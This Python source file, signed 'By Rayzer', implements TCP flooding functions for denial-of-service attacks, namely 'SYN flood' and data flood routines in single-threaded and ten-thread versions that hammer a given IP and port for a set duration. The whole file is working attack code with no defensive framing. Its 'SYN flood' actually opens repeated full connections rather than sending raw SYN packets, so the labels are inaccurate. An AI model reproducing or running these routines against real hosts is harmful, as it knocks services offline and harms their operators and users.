# By Rayzer
import socket
import random
import time
import threading
from utils.colors import color

# By Rayzer
def tcp_syn_flood_single(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    end_time = time.time() + duration
    packet_count = 0

    print(color(f"[*] Starting TCP SYN flood (Single) on {ip}:{port} for {duration} seconds...", "blue"))
    try:
        while time.time() < end_time:
            sock.connect_ex((ip, port))
            packet_count += 1
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except Exception as e:
        print(color(f"[!] Error during TCP SYN flood (Single): {e}", "red"))
    finally:
        sock.close()
        print(color(f"[+] TCP SYN flood (Single) complete! Sent {packet_count} SYN packets.", "green"))

# By Rayzer
def tcp_syn_flood_multi(ip, port, duration):
    end_time = time.time() + duration
    packet_count = [0]

    def syn_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        while time.time() < end_time:
            try:
                sock.connect_ex((ip, port))
                packet_count[0] += 1
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            except:
                pass
        sock.close()

    print(color(f"[*] Starting TCP SYN flood (Multi-threaded) on {ip}:{port} for {duration} seconds...", "blue"))
    threads = [threading.Thread(target=syn_worker) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(color(f"[+] TCP SYN flood (Multi-threaded) complete! Sent {packet_count[0]} SYN packets.", "green"))

# By Rayzer
def tcp_data_flood_single(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = random.randbytes(packet_size)

    print(color(f"[*] Starting TCP Data flood (Single) on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...", "blue"))
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(payload)
            packet_count += 1
    except Exception as e:
        print(color(f"[!] Error during TCP Data flood (Single): {e}", "red"))
    finally:
        sock.close()
        print(color(f"[+] TCP Data flood (Single) complete! Sent {packet_count} packets.", "green"))

# By Rayzer
def tcp_data_flood_multi(ip, port, duration, packet_size):
    end_time = time.time() + duration
    packet_count = [0]

    def data_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        payload = random.randbytes(packet_size)
        try:
            sock.connect((ip, port))
            while time.time() < end_time:
                sock.send(payload)
                packet_count[0] += 1
        except:
            pass
        sock.close()

    print(color(f"[*] Starting TCP Data flood (Multi-threaded) on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...", "blue"))
    threads = [threading.Thread(target=data_worker) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(color(f"[+] TCP Data flood (Multi-threaded) complete! Sent {packet_count[0]} packets.", "green"))